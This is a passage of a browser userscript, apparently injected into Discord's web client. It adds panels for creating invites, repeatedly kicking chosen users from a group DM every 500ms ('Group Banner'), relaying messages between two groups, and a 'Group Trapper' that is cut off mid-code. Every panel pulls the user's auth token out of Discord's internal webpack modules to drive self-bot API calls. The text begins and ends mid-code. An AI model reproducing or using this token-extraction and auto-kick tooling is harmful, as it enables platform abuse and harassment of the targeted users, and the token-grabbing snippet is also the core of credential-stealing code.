        const response = await fetch(`https://discord.com/api/v9/channels/${groupId}/invites`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token,
                "content-type": "application/json"
            },
            "body": JSON.stringify({ "max_age": maxAge }),
            "method": "POST"
        });

        if (response.status === 404) {
            return { error: 'Invalid ID' };
        }

        const data = await response.json();
        return data;
    }

    // Handle the Create button click
    createButton.addEventListener('click', async () => {
        const groupId = groupIdInput.value.trim();
        const timeStr = timeInput.value.trim();
        const maxAge = timeToSeconds(timeStr);

        if (maxAge > 604800) {
            errorLabel.style.display = 'block';
        } else {
            errorLabel.style.display = 'none';
            const inviteData = await fetchInvite(groupId, maxAge);

            if (inviteData.error) {
                inviteLabel.value = inviteData.error;
            } else {
                inviteLabel.value = `https://discord.gg/${inviteData.code}`;
            }
        }
    });

    // Handle the Copy button click
    copyButton.addEventListener('click', () => {
        inviteLabel.select();
        document.execCommand('copy');
    });
})();

(function() {
    // Create the main UI container
    const uiContainer5 = document.createElement('div');
    uiContainer5.style.position = 'fixed';
    uiContainer5.style.bottom = '20px';
    uiContainer5.style.right = '20px';
    uiContainer5.style.width = '350px';
    uiContainer5.style.height = 'auto';
    uiContainer5.style.backgroundColor = 'black';
    uiContainer5.style.color = 'white';
    uiContainer5.style.zIndex = '2000';
    uiContainer5.style.display = 'none';
    uiContainer5.style.flexDirection = 'column';
    uiContainer5.style.justifyContent = 'space-between';
    uiContainer5.style.alignItems = 'center';
    uiContainer5.style.padding = '20px';
    uiContainer5.style.border = '1px solid white';
    uiContainer5.style.borderRadius = '10px';
    uiContainer5.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer5);

// Create and style the open button for the new UI container
const openNewButton5 = document.createElement('button');
openNewButton5.textContent = 'Page 5';
openNewButton5.style.position = 'fixed';
openNewButton5.style.bottom = '180px';
openNewButton5.style.right = '120px';
openNewButton5.style.zIndex = '1000';
openNewButton5.style.padding = '10px';
openNewButton5.style.backgroundColor = '#333';
openNewButton5.style.color = 'white';
openNewButton5.style.border = 'none';
openNewButton5.style.borderRadius = '5px';
document.body.appendChild(openNewButton5);

// Create and style the close button for the new UI container
const closeNewButton5 = document.createElement('button');
closeNewButton5.textContent = 'Close';
closeNewButton5.style.padding = '10px';
closeNewButton5.style.backgroundColor = '#333';
closeNewButton5.style.color = 'white';
closeNewButton5.style.border = 'none';
closeNewButton5.style.borderRadius = '5px';
closeNewButton5.style.marginTop = '10px';
uiContainer5.appendChild(closeNewButton5);

// Show the new UI container when the open button is pressed
openNewButton5.addEventListener('click', () => {
  uiContainer5.style.display = 'block';
  openNewButton5.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton5.addEventListener('click', () => {
  uiContainer5.style.display = 'none';
  openNewButton5.style.display = 'block';
});

    // Create the title label
    const titleLabel5 = document.createElement('h1');
    titleLabel5.textContent = 'Custom Server Invites';
    titleLabel5.style.marginBottom = '20px';
    uiContainer5.appendChild(titleLabel5);

    // Create the Server ID input
    const serverIdInput = document.createElement('input');
    serverIdInput.type = 'text';
    serverIdInput.placeholder = 'ID';
    serverIdInput.style.marginBottom = '20px';
    serverIdInput.style.padding = '10px';
    serverIdInput.style.backgroundColor = 'black';
    serverIdInput.style.color = 'white';
    serverIdInput.style.border = '1px solid white';
    serverIdInput.style.width = '100%';
    serverIdInput.style.fontSize = '16px';
    uiContainer5.appendChild(serverIdInput);

    // Create the Invite Length label
    const inviteLengthLabel2 = document.createElement('div');
    inviteLengthLabel2.textContent = 'Invite Length';
    inviteLengthLabel2.style.marginBottom = '5px';
    inviteLengthLabel2.style.fontSize = '16px';
    uiContainer5.appendChild(inviteLengthLabel2);

    // Create the time input
    const timeInput2 = document.createElement('input');
    timeInput2.type = 'text';
    timeInput2.placeholder = '1d0h0m0s';
    timeInput2.style.marginBottom = '20px';
    timeInput2.style.padding = '10px';
    timeInput2.style.backgroundColor = 'black';
    timeInput2.style.color = 'white';
    timeInput2.style.border = '1px solid white';
    timeInput2.style.width = '100%';
    timeInput2.style.fontSize = '16px';
    uiContainer5.appendChild(timeInput2);

    // Create the Invite Length error message label
    const inviteLengthErrorLabel = document.createElement('div');
    inviteLengthErrorLabel.textContent = 'The maximum amount of time you can make an invite with infinity aside is 1 week!';
    inviteLengthErrorLabel.style.color = 'red';
    inviteLengthErrorLabel.style.backgroundColor = 'transparent';
    inviteLengthErrorLabel.style.display = 'none';
    inviteLengthErrorLabel.style.marginBottom = '20px';
    uiContainer5.appendChild(inviteLengthErrorLabel);

    // Create the Max Uses label
    const maxUsesLabel = document.createElement('div');
    maxUsesLabel.textContent = 'Max Uses';
    maxUsesLabel.style.marginBottom = '5px';
    maxUsesLabel.style.fontSize = '16px';
    uiContainer5.appendChild(maxUsesLabel);

    // Create the max uses input
    const maxUsesInput = document.createElement('input');
    maxUsesInput.type = 'text';
    maxUsesInput.placeholder = '0 (for infinity) or 1-100';
    maxUsesInput.style.marginBottom = '20px';
    maxUsesInput.style.padding = '10px';
    maxUsesInput.style.backgroundColor = 'black';
    maxUsesInput.style.color = 'white';
    maxUsesInput.style.border = '1px solid white';
    maxUsesInput.style.width = '100%';
    maxUsesInput.style.fontSize = '16px';
    uiContainer5.appendChild(maxUsesInput);

    // Create the Max Uses error message label
    const maxUsesErrorLabel = document.createElement('div');
    maxUsesErrorLabel.textContent = 'The maximum amount of users you can allow with infinity aside is 100!';
    maxUsesErrorLabel.style.color = 'red';
    maxUsesErrorLabel.style.backgroundColor = 'transparent';
    maxUsesErrorLabel.style.display = 'none';
    maxUsesErrorLabel.style.marginBottom = '20px';
    uiContainer5.appendChild(maxUsesErrorLabel);

    // Create the Create button
    const createButton2 = document.createElement('button');
    createButton2.textContent = 'Create';
    createButton2.style.marginBottom = '20px';
    createButton2.style.padding = '10px';
    createButton2.style.backgroundColor = 'black';
    createButton2.style.color = 'white';
    createButton2.style.border = '1px solid white';
    createButton2.style.cursor = 'pointer';
    createButton2.style.width = '100%';
    createButton2.style.fontSize = '16px';
    uiContainer5.appendChild(createButton2);

    // Create the invite label
    const inviteLabel2 = document.createElement('input');
    inviteLabel2.type = 'text';
    inviteLabel2.readOnly = true;
    inviteLabel2.style.flexGrow = '1';
    inviteLabel2.style.marginBottom = '20px';
    inviteLabel2.style.padding = '10px';
    inviteLabel2.style.backgroundColor = 'black';
    inviteLabel2.style.color = 'white';
    inviteLabel2.style.border = '1px solid white';
    inviteLabel2.style.width = '100%';
    inviteLabel2.style.fontSize = '16px';
    uiContainer5.appendChild(inviteLabel2);

    // Create the Copy button
    const copyButton2 = document.createElement('button');
    copyButton2.textContent = 'Copy';
    copyButton2.style.padding = '10px';
    copyButton2.style.backgroundColor = 'black';
    copyButton2.style.color = 'white';
    copyButton2.style.border = '1px solid white';
    copyButton2.style.cursor = 'pointer';
    copyButton2.style.width = '100%';
    copyButton2.style.fontSize = '16px';
    uiContainer5.appendChild(copyButton2);

    // Function to convert time to seconds
    function timeToSeconds(timeStr) {
        if (timeStr.toLowerCase() === 'inf' || timeStr.toLowerCase() === 'infinity') {
            return 0;
        }

        const timeRegex = /(\d+w)?(\d+d)?(\d+h)?(\d+m)?(\d+s)?/;
        const match = timeStr.match(timeRegex);

        let weeks = match[1] ? parseInt(match[1]) * 604800 : 0;
        let days = match[2] ? parseInt(match[2]) * 86400 : 0;
        let hours = match[3] ? parseInt(match[3]) * 3600 : 0;
        let minutes = match[4] ? parseInt(match[4]) * 60 : 0;
        let seconds = match[5] ? parseInt(match[5]) : 0;

        return weeks + days + hours + minutes + seconds;
    }

    // Function to fetch the invite
    async function fetchInvite(groupId, maxAge, maxUses) {
        const token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();

        const response = await fetch(`https://discord.com/api/v9/channels/${groupId}/invites`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token,
                "content-type": "application/json"
            },
            "body": JSON.stringify({ "max_age": maxAge, "max_uses": maxUses }),
            "method": "POST"
        });

        if (response.status === 404) {
            return { error: 'Invalid ID' };
        }

        const data = await response.json();
        return data;
    }

    // Handle the Create button click
    createButton2.addEventListener('click', async () => {
        const groupId = serverIdInput.value.trim();
        const timeStr = timeInput2.value.trim();
        const maxUsesStr = maxUsesInput.value.trim();
        const maxAge = timeToSeconds(timeStr);
        const maxUses = parseInt(maxUsesStr);

        let showLengthError = false;
        let showUsesError = false;

        if (maxAge > 604800 && !(timeStr.toLowerCase() === 'inf' || timeStr.toLowerCase() === 'infinity')) {
            showLengthError = true;
        }

        if ((timeStr.toLowerCase() === 'inf' || timeStr.toLowerCase() === 'infinity') && maxUses > 0) {
            showUsesError = true;
        } else if (maxUses < 0 || maxUses > 100) {
            showUsesError = true;
        }

        inviteLengthErrorLabel.style.display = showLengthError ? 'block' : 'none';
        maxUsesErrorLabel.style.display = showUsesError ? 'block' : 'none';

        if (!showLengthError && !showUsesError) {
            const inviteData = await fetchInvite(groupId, maxAge, maxUses);

            if (inviteData.error) {
                inviteLabel2.value = inviteData.error;
            } else {
                inviteLabel2.value = `https://discord.gg/${inviteData.code}`;
            }
        }
    });

    // Handle the Copy button click
    copyButton2.addEventListener('click', () => {
        inviteLabel2.select();
        document.execCommand('copy');
    });
})();








(async () => {
  // Create the UI container
  const uiContainer6 = document.createElement('div');
  uiContainer6.style.position = 'fixed';
  uiContainer6.style.bottom = '20px';
  uiContainer6.style.right = '20px';
  uiContainer6.style.width = '350px';
  uiContainer6.style.height = 'auto';
  uiContainer6.style.backgroundColor = 'black';
  uiContainer6.style.color = 'white';
  uiContainer6.style.zIndex = '2000';
  uiContainer6.style.display = 'none';
  uiContainer6.style.flexDirection = 'column';
  uiContainer6.style.justifyContent = 'space-between';
  uiContainer6.style.alignItems = 'center';
  uiContainer6.style.padding = '20px';
  uiContainer6.style.border = '1px solid white';
  uiContainer6.style.borderRadius = '10px';
  uiContainer6.style.fontFamily = 'GG Sans, sans-serif';
  document.body.appendChild(uiContainer6);

// Create and style the open button for the new UI container
const openNewButton6 = document.createElement('button');
openNewButton6.textContent = 'Page 6';
openNewButton6.style.position = 'fixed';
openNewButton6.style.bottom = '180px';
openNewButton6.style.right = '60px';
openNewButton6.style.zIndex = '1000';
openNewButton6.style.padding = '10px';
openNewButton6.style.backgroundColor = '#333';
openNewButton6.style.color = 'white';
openNewButton6.style.border = 'none';
openNewButton6.style.borderRadius = '5px';
document.body.appendChild(openNewButton6);

// Create and style the close button for the new UI container
const closeNewButton6 = document.createElement('button');
closeNewButton6.textContent = 'Close';
closeNewButton6.style.padding = '10px';
closeNewButton6.style.backgroundColor = '#333';
closeNewButton6.style.color = 'white';
closeNewButton6.style.border = 'none';
closeNewButton6.style.borderRadius = '5px';
closeNewButton6.style.marginTop = '10px';
uiContainer6.appendChild(closeNewButton6);

// Show the new UI container when the open button is pressed
openNewButton6.addEventListener('click', () => {
  uiContainer6.style.display = 'block';
  openNewButton6.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton6.addEventListener('click', () => {
  uiContainer6.style.display = 'none';
  openNewButton6.style.display = 'block';
});

  // Title label
  const titleLabel6 = document.createElement('div');
  titleLabel6.textContent = 'Group Banner';
  titleLabel6.style.fontSize = '18px';
  titleLabel6.style.fontWeight = 'bold';
  titleLabel6.style.marginBottom = '20px';
  uiContainer6.appendChild(titleLabel6);

  // Group ID input
  const groupIdLabel = document.createElement('label');
  groupIdLabel.textContent = 'Group ID:';
  groupIdLabel.style.color = 'white';
  uiContainer6.appendChild(groupIdLabel);

  const groupIdInput = document.createElement('input');
  groupIdInput.type = 'text';
  groupIdInput.placeholder = 'Enter Group ID';
  groupIdInput.style.marginBottom = '20px';
  groupIdInput.style.padding = '10px';
  groupIdInput.style.backgroundColor = 'black';
  groupIdInput.style.color = 'white';
  groupIdInput.style.border = '1px solid white';
  groupIdInput.style.width = '100%';
  groupIdInput.style.fontSize = '16px';
  uiContainer6.appendChild(groupIdInput);

  // User ID inputs
  const userIdContainer = document.createElement('div');
  uiContainer6.appendChild(userIdContainer);

  function createUserRow() {
    const row = document.createElement('div');
    row.style.display = 'flex';
    row.style.alignItems = 'center';
    row.style.marginBottom = '10px';

    const userIdInput = document.createElement('input');
    userIdInput.type = 'text';
    userIdInput.placeholder = 'Enter User ID';
    userIdInput.style.marginRight = '10px';
    userIdInput.style.padding = '10px';
    userIdInput.style.backgroundColor = 'black';
    userIdInput.style.color = 'white';
    userIdInput.style.border = '1px solid white';
    userIdInput.style.flex = '1';
    userIdInput.style.fontSize = '16px';
    row.appendChild(userIdInput);

    const removeRowButton = document.createElement('button');
    removeRowButton.textContent = 'Remove Row';
    removeRowButton.style.padding = '10px';
    removeRowButton.style.backgroundColor = 'black';
    removeRowButton.style.color = 'white';
    removeRowButton.style.border = '1px solid white';
    removeRowButton.style.cursor = 'pointer';
    removeRowButton.style.width = '120px'; // Adjust width to fix layout
    removeRowButton.style.fontSize = '16px';
    removeRowButton.addEventListener('click', () => {
      userIdContainer.removeChild(row);
      if (userIdContainer.children.length === 0) {
        createUserRow();
      }
    });
    row.appendChild(removeRowButton);

    userIdContainer.appendChild(row);
  }

  // Add initial row
  createUserRow();

  // Add Row button
  const addRowButton = document.createElement('button');
  addRowButton.textContent = 'Add Row';
  addRowButton.style.marginBottom = '20px';
  addRowButton.style.padding = '10px';
  addRowButton.style.backgroundColor = 'black';
  addRowButton.style.color = 'white';
  addRowButton.style.border = '1px solid white';
  addRowButton.style.cursor = 'pointer';
  addRowButton.style.width = '100%';
  addRowButton.style.fontSize = '16px';
  addRowButton.addEventListener('click', () => {
    createUserRow();
  });
  uiContainer6.appendChild(addRowButton);

  // Start/Stop button
  const startStopButton = document.createElement('button');
  startStopButton.textContent = 'Start';
  startStopButton.style.marginBottom = '20px';
  startStopButton.style.padding = '10px';
  startStopButton.style.backgroundColor = 'black';
  startStopButton.style.color = 'white';
  startStopButton.style.border = '1px solid white';
  startStopButton.style.cursor = 'pointer';
  startStopButton.style.width = '100%';
  startStopButton.style.fontSize = '16px';
  uiContainer6.appendChild(startStopButton);

  // Status label
  const statusLabel = document.createElement('div');
  statusLabel.textContent = 'Status: Idle';
  statusLabel.style.color = 'white';
  uiContainer6.appendChild(statusLabel);

  // Variables for state management
  let isChecking = false;
  let intervalId = null;

  // Function to get the authorization token
  function getToken() {
    return (webpackChunkdiscord_app.push([[''], {}, e => {
      m = [];
      for (let c in e.c) m.push(e.c[c]);
    }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
  }

  // Function to fetch the channel data
  async function fetchChannelData(groupId) {
    const response = await fetch(`https://discord.com/api/v9/channels/${groupId}`, {
      headers: {
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken()
      },
      method: "GET"
    });

    if (!response.ok) {
      throw new Error(`Network response was not ok: ${response.statusText}`);
    }

    return response.json();
  }

  // Function to ban a recipient
  async function banRecipient(groupId, userId) {
    const response = await fetch(`https://discord.com/api/v9/channels/${groupId}/recipients/${userId}`, {
      headers: {
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken()
      },
      method: "DELETE"
    });

    if (!response.ok) {
      console.error('Failed to ban recipient:', response.status, response.statusText);
    }
  }

  // Function to check if the user ID is in the recipients and ban if necessary
  async function checkAndBanRecipients(userId) {
    const groupId = groupIdInput.value.trim();

    if (!groupId || !userId) {
      statusLabel.textContent = 'Status: Please provide a Group ID and User ID.';
      return;
    }

    try {
      const data = await fetchChannelData(groupId);
      const recipientIds = data.recipients.map(recipient => recipient.id);

      if (recipientIds.includes(userId)) {
        await banRecipient(groupId, userId);
      }
    } catch (error) {
      console.error('Error checking recipients:', error);
    }
  }

  // Handle Start/Stop button click
  startStopButton.addEventListener('click', () => {
    if (isChecking) {
      clearInterval(intervalId);
      intervalId = null;
      startStopButton.textContent = 'Start';
      statusLabel.textContent = 'Status: Stopped';
    } else {
      const userIdInputs = Array.from(userIdContainer.querySelectorAll('input'));

      if (userIdInputs.length === 0) {
        statusLabel.textContent = 'Status: No User IDs available.';
        return;
      }

      let currentIndex = 0;
      intervalId = setInterval(() => {
        if (userIdInputs.length === 0) return;

        const userIdInput = userIdInputs[currentIndex];
        const userId = userIdInput.value.trim();

        if (userId) {
          checkAndBanRecipients(userId);
        }

        // Proceed to the next ID
        currentIndex = (currentIndex + 1) % userIdInputs.length;
      }, 500); // Check every 500ms

      startStopButton.textContent = 'Stop';
      statusLabel.textContent = 'Status: Checking...';
    }
    isChecking = !isChecking;
  });
})();







(function() {
  // Create the main UI container
  const uiContainer7 = document.createElement('div');
  uiContainer7.style.position = 'fixed';
  uiContainer7.style.bottom = '20px';
  uiContainer7.style.right = '20px';
  uiContainer7.style.width = '350px';
  uiContainer7.style.height = 'auto';
  uiContainer7.style.backgroundColor = 'black';
  uiContainer7.style.color = 'white';
  uiContainer7.style.zIndex = '2000';
  uiContainer7.style.display = 'none';
  uiContainer7.style.flexDirection = 'column';
  uiContainer7.style.justifyContent = 'space-between';
  uiContainer7.style.alignItems = 'center';
  uiContainer7.style.padding = '20px';
  uiContainer7.style.border = '1px solid white';
  uiContainer7.style.borderRadius = '10px';
  uiContainer7.style.fontFamily = 'GG Sans, sans-serif';
  document.body.appendChild(uiContainer7);

// Create and style the open button for the new UI container
const openNewButton7 = document.createElement('button');
openNewButton7.textContent = 'Page 7';
openNewButton7.style.position = 'fixed';
openNewButton7.style.bottom = '140px';
openNewButton7.style.right = '180px';
openNewButton7.style.zIndex = '1000';
openNewButton7.style.padding = '10px';
openNewButton7.style.backgroundColor = '#333';
openNewButton7.style.color = 'white';
openNewButton7.style.border = 'none';
openNewButton7.style.borderRadius = '5px';
document.body.appendChild(openNewButton7);

// Create and style the close button for the new UI container
const closeNewButton7 = document.createElement('button');
closeNewButton7.textContent = 'Close';
closeNewButton7.style.padding = '10px';
closeNewButton7.style.backgroundColor = '#333';
closeNewButton7.style.color = 'white';
closeNewButton7.style.border = 'none';
closeNewButton7.style.borderRadius = '5px';
closeNewButton7.style.marginTop = '10px';
uiContainer7.appendChild(closeNewButton7);

// Show the new UI container when the open button is pressed
openNewButton7.addEventListener('click', () => {
  uiContainer7.style.display = 'block';
  openNewButton7.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton7.addEventListener('click', () => {
  uiContainer7.style.display = 'none';
  openNewButton7.style.display = 'block';
});

  // Create the title label
  const titleLabel7 = document.createElement('h1');
  titleLabel7.textContent = 'Group Extender';
  titleLabel7.style.marginBottom = '20px';
  uiContainer7.appendChild(titleLabel7);

  // Create the Group1 input
  const group1Input = document.createElement('input');
  group1Input.type = 'text';
  group1Input.placeholder = 'Group 1 Channel ID';
  group1Input.style.marginBottom = '20px';
  group1Input.style.padding = '10px';
  group1Input.style.backgroundColor = 'black';
  group1Input.style.color = 'white';
  group1Input.style.border = '1px solid white';
  group1Input.style.width = '100%';
  group1Input.style.fontSize = '16px';
  uiContainer7.appendChild(group1Input);

  // Create the Group2 input
  const group2Input = document.createElement('input');
  group2Input.type = 'text';
  group2Input.placeholder = 'Group 2 Channel ID';
  group2Input.style.marginBottom = '20px';
  group2Input.style.padding = '10px';
  group2Input.style.backgroundColor = 'black';
  group2Input.style.color = 'white';
  group2Input.style.border = '1px solid white';
  group2Input.style.width = '100%';
  group2Input.style.fontSize = '16px';
  uiContainer7.appendChild(group2Input);

  // Create the Submit button
  const submitButton = document.createElement('button');
  submitButton.textContent = 'Submit';
  submitButton.style.marginBottom = '20px';
  submitButton.style.padding = '10px';
  submitButton.style.backgroundColor = 'black';
  submitButton.style.color = 'white';
  submitButton.style.border = '1px solid white';
  submitButton.style.cursor = 'pointer';
  submitButton.style.width = '100%';
  submitButton.style.fontSize = '16px';
  uiContainer7.appendChild(submitButton);

  // Create the Start/Stop button
  const toggleButton = document.createElement('button');
  toggleButton.textContent = 'Start';
  toggleButton.style.padding = '10px';
  toggleButton.style.backgroundColor = 'black';
  toggleButton.style.color = 'white';
  toggleButton.style.border = '1px solid white';
  toggleButton.style.cursor = 'pointer';
  toggleButton.style.width = '100%';
  toggleButton.style.fontSize = '16px';
  uiContainer7.appendChild(toggleButton);

  // Submit button functionality
  submitButton.onclick = () => {
    const group1 = group1Input.value;
    const group2 = group2Input.value;
    channelPairs[0] = { source: group1, target: group2 };
    channelPairs[1] = { source: group2, target: group1 };
    console.log('Channel pairs updated:', channelPairs);
  };

  // Toggle polling functionality
  let pollingEnabled = false;
  let pollingInterval;

  toggleButton.onclick = () => {
    if (pollingEnabled) {
      clearInterval(pollingInterval);
      console.log('Polling disabled');
    } else {
      pollingInterval = setInterval(() => {
        channelPairs.forEach(pair => {
          checkForNewMessages(pair.source, pair.target);
        });
      }, 1000); // Adjust interval as needed
      console.log('Polling enabled');
    }
    pollingEnabled = !pollingEnabled;
    toggleButton.textContent = pollingEnabled ? 'Stop' : 'Start';
  };

  const channelPairs = [
    { source: 'Group1', target: 'Group2' },
    { source: 'Group2', target: 'Group1' }
  ];

  let processedMessageIDs = {}; // Track IDs of messages that have been processed for each source

  // Function to get the authorization token
  function getToken() {
    return (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
  }

  // Function to fetch the most recent messages from a channel
  function fetchRecentMessages(sourceChannelID, limit = 3) {
    const apiBaseUrl = `https://discord.com/api/v9/channels/${sourceChannelID}/messages`;
    return fetch(apiBaseUrl + `?limit=${limit}`, {
      headers: {
        "accept-language": "en-US",
        "authorization": getToken(),
        "content-type": "application/json"
      },
      method: "GET"
    })
    .then(response => response.json())
    .then(data => {
      if (data.length > 0) {
        return data; // Return the most recent messages
      } else {
        throw new Error('No messages found.');
      }
    })
    .catch(error => {
      console.error(`Error fetching messages from ${sourceChannelID}:`, error);
      throw error; // Propagate the error for further handling
    });
  }

  // Function to format the message content
  function formatMessageContent(message) {
    const { author, content, timestamp } = message;
    
    // Format timestamp as 'Today at (time) CST' without zero-padding
    const date = new Date(timestamp);
    let hours = date.getHours();
    let minutes = date.getMinutes();

    // Determine AM or PM
    const ampm = hours >= 12 ? 'PM' : 'AM';
    // Convert hours to 12-hour format
    hours = hours % 12;
    hours = hours ? hours : 12; // the hour '0' should be '12'
    // Format minutes without zero-padding
    minutes = minutes < 10 ? `0${minutes}` : minutes;
    // Create time string in 12-hour format
    const time = `${hours}:${minutes} ${ampm}`;

    const formattedTimestamp = `Today at ${time} CST`;

    return `-# from: <@${author.id}> ${formattedTimestamp}\n${content}`;
  }

  // Function to fetch an image as a File object
  async function fetchImage(url) {
    const response = await fetch(url);
    const blob = await response.blob();
    return new File([blob], 'attachment.png', { type: blob.type });
  }

  // Function to fetch the avatar as a File object
  async function fetchAvatar(authorID, avatarHash) {
    const url = `https://cdn.discordapp.com/avatars/${authorID}/${avatarHash}.webp?size=40`;
    return fetchImage(url);
  }

  // Function to post a new message with attachments to a target channel
  async function postMessage(targetChannelID, content, attachments) {
    const formData = new FormData();
    formData.append('content', content);

    // Append each file attachment to the FormData
    attachments.forEach((attachment, index) => {
      formData.append('file', attachment, `attachment_${index}.png`);
    });

    const targetApiBaseUrl = `https://discord.com/api/v9/channels/${targetChannelID}/messages`;

    return fetch(targetApiBaseUrl, {
      headers: {
        "accept-language": "en-US",
        "authorization": getToken()
      },
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log('Message posted:', data);
    })
    .catch(error => {
      console.error('Error posting message:', error);
    });
  }

  // Function to check for new messages and post if needed
  async function checkForNewMessages(sourceChannelID, targetChannelID) {
    try {
      const messages = await fetchRecentMessages(sourceChannelID);
      
      if (messages.length > 0) {
        // Extract the most recent message
        const [mostRecent] = messages;

        const { id, author, content, attachments } = mostRecent;

        // Check if the message contains a mention of the author
if (content.includes('from: <@')) {
  console.log('Message contains "from: <@". Skipping.');
  return;
}

        // Fetch the author's avatar image
        const avatarAttachment = await fetchAvatar(author.id, author.avatar);

        // Fetch all image attachments
        const imageAttachments = await Promise.all(attachments.map(async (attachment) => {
          if (attachment.content_type.startsWith('image/')) {
            return fetchImage(attachment.url);
          }
          return null;
        }));

        // Filter out null values from the imageAttachments array
        const validAttachments = imageAttachments.filter(attachment => attachment !== null);

        // Format the message content
        const formattedContent = formatMessageContent(mostRecent);

        // If we have a new message ID
        if (!processedMessageIDs[sourceChannelID]) {
          processedMessageIDs[sourceChannelID] = new Set();
        }

        if (!processedMessageIDs[sourceChannelID].has(id)) {
          console.log(`New message detected in ${sourceChannelID} with ID:`, id);

          // Mark this ID as processed
          processedMessageIDs[sourceChannelID].add(id);

          // Post the message and attachments to the target channel
          await postMessage(targetChannelID, formattedContent, [avatarAttachment, ...validAttachments]);

          console.log('Message forwarded:', mostRecent);
        } else {
          console.log('Message has already been processed.');
        }
      }
    } catch (error) {
      console.error('Error processing messages:', error);
    }
  }
})();





(async () => {
  // Create the UI container
  const uiContainer8 = document.createElement('div');
  uiContainer8.style.position = 'fixed';
  uiContainer8.style.bottom = '20px';
  uiContainer8.style.right = '20px';
  uiContainer8.style.width = '350px';
  uiContainer8.style.height = 'auto';
  uiContainer8.style.backgroundColor = 'black';
  uiContainer8.style.color = 'white';
  uiContainer8.style.zIndex = '2000';
  uiContainer8.style.display = 'none';
  uiContainer8.style.flexDirection = 'column';
  uiContainer8.style.justifyContent = 'space-between';
  uiContainer8.style.alignItems = 'center';
  uiContainer8.style.padding = '20px';
  uiContainer8.style.border = '1px solid white';
  uiContainer8.style.borderRadius = '10px';
  uiContainer8.style.fontFamily = 'GG Sans, sans-serif';
  document.body.appendChild(uiContainer8);

// Create and style the open button for the new UI container
const openNewButton8 = document.createElement('button');
openNewButton8.textContent = 'Page 8';
openNewButton8.style.position = 'fixed';
openNewButton8.style.bottom = '140px';
openNewButton8.style.right = '120px';
openNewButton8.style.zIndex = '1000';
openNewButton8.style.padding = '10px';
openNewButton8.style.backgroundColor = '#333';
openNewButton8.style.color = 'white';
openNewButton8.style.border = 'none';
openNewButton8.style.borderRadius = '5px';
document.body.appendChild(openNewButton8);

// Create and style the close button for the new UI container
const closeNewButton8 = document.createElement('button');
closeNewButton8.textContent = 'Close';
closeNewButton8.style.padding = '10px';
closeNewButton8.style.backgroundColor = '#333';
closeNewButton8.style.color = 'white';
closeNewButton8.style.border = 'none';
closeNewButton8.style.borderRadius = '5px';
closeNewButton8.style.marginTop = '10px';
uiContainer8.appendChild(closeNewButton8);

// Show the new UI container when the open button is pressed
openNewButton8.addEventListener('click', () => {
  uiContainer8.style.display = 'block';
  openNewButton8.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton8.addEventListener('click', () => {
  uiContainer8.style.display = 'none';
  openNewButton8.style.display = 'block';
});

  // Title label
  const titleLabel8 = document.createElement('div');
  titleLabel8.textContent = 'Group Trapper';
  titleLabel8.style.fontSize = '18px';
  titleLabel8.style.fontWeight = 'bold';
  titleLabel8.style.marginBottom = '20px';
  uiContainer8.appendChild(titleLabel8);

  // Group ID input
  const groupIdLabel2 = document.createElement('label');
  groupIdLabel2.textContent = 'Group ID:';
  groupIdLabel2.style.color = 'white';
  uiContainer8.appendChild(groupIdLabel2);

  const groupIdInput2 = document.createElement('input');
  groupIdInput2.type = 'text';
  groupIdInput2.placeholder = 'Enter Group ID';
  groupIdInput2.style.marginBottom = '20px';
  groupIdInput2.style.padding = '10px';
  groupIdInput2.style.backgroundColor = 'black';
  groupIdInput2.style.color = 'white';
  groupIdInput2.style.border = '1px solid white';
  groupIdInput2.style.width = '100%';
  groupIdInput2.style.fontSize = '16px';
  uiContainer8.appendChild(groupIdInput2);

  // User ID inputs
  const userIdContainer2 = document.createElement('div');
  uiContainer8.appendChild(userIdContainer2);

  function createUserRow() {
    const row = document.createElement('div');
    row.style.display = 'flex';
    row.style.alignItems = 'center';
    row.style.marginBottom = '10px';

    const userIdInput2 = document.createElement('input');
    userIdInput2.type = 'text';
    userIdInput2.placeholder = 'Enter User ID';
    userIdInput2.style.marginRight = '10px';
    userIdInput2.style.padding = '10px';
    userIdInput2.style.backgroundColor = 'black';
    userIdInput2.style.color = 'white';
    userIdInput2.style.border = '1px solid white';
    userIdInput2.style.flex = '1';
    userIdInput2.style.fontSize = '16px';
    row.appendChild(userIdInput2);

    const removeRowButton2 = document.createElement('button');
    removeRowButton2.textContent = 'Remove Row';
    removeRowButton2.style.padding = '10px';
    removeRowButton2.style.backgroundColor = 'black';
    removeRowButton2.style.color = 'white';
    removeRowButton2.style.border = '1px solid white';
    removeRowButton2.style.cursor = 'pointer';
    removeRowButton2.style.width = '120px'; // Adjust width to fix layout
    removeRowButton2.style.fontSize = '16px';
    removeRowButton2.addEventListener('click', () => {
      userIdContainer2.removeChild(row);
      if (userIdContainer2.children.length === 0) {
        createUserRow();
      }
    });
    row.appendChild(removeRowButton2);

    userIdContainer2.appendChild(row);
  }

  // Add initial row
  createUserRow();

  // Add Row button
  const addRowButton2 = document.createElement('button');
  addRowButton2.textContent = 'Add Row';
  addRowButton2.style.marginBottom = '20px';
  addRowButton2.style.padding = '10px';
  addRowButton2.style.backgroundColor = 'black';
  addRowButton2.style.color = 'white';
  addRowButton2.style.border = '1px solid white';
  addRowButton2.style.cursor = 'pointer';
  addRowButton2.style.width = '100%';
  addRowButton2.style.fontSize = '16px';
  addRowButton2.addEventListener('click', () => {
    createUserRow();
  });
  uiContainer8.appendChild(addRowButton2);

  // Start/Stop button
  const startStopButton2 = document.createElement('button');
  startStopButton2.textContent = 'Start';
  startStopButton2.style.marginBottom = '20px';
  startStopButton2.style.padding = '10px';
  startStopButton2.style.backgroundColor = 'black';
  startStopButton2.style.color = 'white';
